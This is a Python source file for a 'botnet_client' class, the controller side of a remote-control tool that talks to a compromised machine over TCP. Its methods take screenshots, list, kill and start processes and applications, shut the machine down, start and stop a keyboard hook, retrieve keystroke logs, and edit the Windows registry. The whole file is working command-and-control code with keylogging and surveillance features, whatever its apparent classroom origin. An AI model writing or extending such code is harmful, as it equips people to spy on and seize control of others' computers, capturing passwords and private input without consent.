import socket
import io
import PIL.Image
import time

class botnet_client:
#-------------------PRIVATE AREA-------------------
    HOST = '127.0.0.1'  # The default server's hostname or IP address
    PORT = 26101  # The default port used by the server
    BUF_SIZE = 256
    def __init__(self, host = HOST, port = PORT, buf_size = BUF_SIZE):
        self.host = host
        self.port = port
        self.buf_size = buf_size
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #destructor of object
    def __del__(self):
        self.close_connect()
            
    def __recv(self):
        self.conn.send(b"1")
        size = int(self.nr.readline().strip())
        chunks = []
        while size > 0:
            chunk = self.conn.recv(min(size, self.buf_size))
            if chunk == b'':
                raise RuntimeError("socket connection broken")
            chunks.append(chunk)
            size -= len(chunk)
        return b''.join(chunks)
    
    def __send(self, data):
        self.conn.recv(1)
        self.nw.write(str(len(data)) + '\n'); self.nw.flush()
        self.conn.sendall(data)
        
    # send request
    def __send_msg(self, msg):
        self.__send(bytes(msg, 'utf-8'))
        
#-------------------PUBLIC AREA-------------------
    def set(self, host = HOST, port = PORT):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.conn.connect((self.host, self.port)) # connection socket
            self.nr = self.conn.makefile(mode = 'r', encoding = 'utf-8') # stream reader
            self.nw = self.conn.makefile(mode = 'w', encoding = 'utf-8') # stream writer
            return "Connected successfully!"
        except:
            return "Connected failed"
    
    def close_connect(self):
        if (self.nr != None):
            self.__send_msg("QUIT")
            self.nr.close()
            self.nw.close()
            self.conn.close()
            self.nr = None
    
    # get screenshot of botnet
    def get_screenshot(self):
        self.__send_msg("PIC")
        # receive data
        data = self.__recv()
        # write data to image
        image = PIL.Image.open(io.BytesIO(data))
        ok = self.conn.recv(1)
        return image
    
    # get list of running process of botnet
    def get_list_process(self):
        self.__send_msg("PROC")
        size = int(self.nr.readline().strip())
        procs = []
        for i in range(size):
            proc = []
            proc.append(self.__recv().decode('utf-8')) # process name
            proc.append(self.__recv().decode('utf-8')) # process id
            proc.append(self.__recv().decode('utf-8')) # thread count
            # add proc to list
            procs.append(proc)
        ok = self.conn.recv(1)
        return procs
    
    # kill process of botnet by pid
    # return string (successful/failed)
    def kill_process(self, pid):
        self.__send_msg("KILLPROC")
        self.nw.write(str(pid) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Killed process at pid {0} successully!".format(pid)
        else:
            return "Killed process at pid {0} failed!".format(pid)
        
    # start process of botnet by name
    def start_process(self, name):
        self.__send_msg("STARTPROC")
        self.nw.write(str(name) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Start process with name {0} successully!".format(name)
        else:
            return "Start process with name {0} failed!".format(name)
    
    # get list of running process of botnet
    def get_list_app(self):
        self.__send_msg("APP")
        size = int(self.nr.readline().strip())
        apps = []
        for i in range(size):
            app = []
            app.append(self.__recv().decode('utf-8')) # app name
            app.append(self.__recv().decode('utf-8')) # app id
            app.append(self.__recv().decode('utf-8')) # thread count
            # add proc to list
            apps.append(app)
        ok = self.conn.recv(1)
        return apps
    
    # kill process of botnet by pid
    def kill_app(self, pid):
        self.__send_msg("KILLAPP")
        self.nw.write(str(pid) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Killed app at pid {0} successully!".format(pid)
        else:
            return "Killed app at pid {0} failed!".format(pid)
        
    # start process of botnet by name
    def start_app(self, name):
        self.__send_msg("STARTAPP")
        self.nw.write(str(name) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Start application with name {0} successully!".format(name)
        else:
            return "Start application with name {0} failed!".format(name)
        
    # shut down server
    def shutdown(self):
        self.__send_msg("SHUTDOWN")
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Shutdown server successfully!"
        else:
            return "Shutdown server failed!"
    
    # start hook key
    def hook_key(self):
        self.__send_msg("HOOK")
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Hook key successfully!"
        else:
            return "Hook key failed!"
    
    # end hook key
    def unhook_key(self):
        self.__send_msg("UNHOOK")
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Unhook key successfully!"
        else:
            return "Unhook key failed!"
    
    # get key log of server
    def get_key_log(self):
        self.__send_msg("KEYLOG")
        data = self.__recv()
        ok = self.conn.recv(1)
        return data.decode("utf-8")
    
    # send registry file to server
    def send_reg_text(self, reg_txt):
        self.__send_msg("REGFILE")
        self.__send(bytes(reg_txt, "utf-8"))
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Execute registry file successfully!"
        else:
            return "Execute registry file failed!"
    
    # send refistry command to server
    def send_reg_cmd(self, cmd, path, val_name, val, val_type):
        self.__send_msg("REGCMD")
        self.__send_msg(cmd)
        self.__send_msg(path)
        self.__send_msg(val_name)
        self.__send_msg(val)
        self.__send_msg(val_type)
        
        if (cmd == "GETVAL"):
            val = self.__recv().decode('utf-8')
        
        ok = self.conn.recv(1)
        if (ok != b'0'):
            if (cmd == "GETVAL"):
                return val_name + " = " + val + "\n"
            elif (cmd == "SETVAL"):
                return "Set value successfully!\n"
            elif (cmd == "DELVAL"):
                return "Delete value successfully!\n"
            elif (cmd == "CREKEY"):
                return "Create key successfully!\n"
            elif (cmd == "DELKEY"):
                return "Delete key successfully!\n"
            else:
                return "Wrong registry command!\n"
        else:
            return "Failed to modify registry!\n"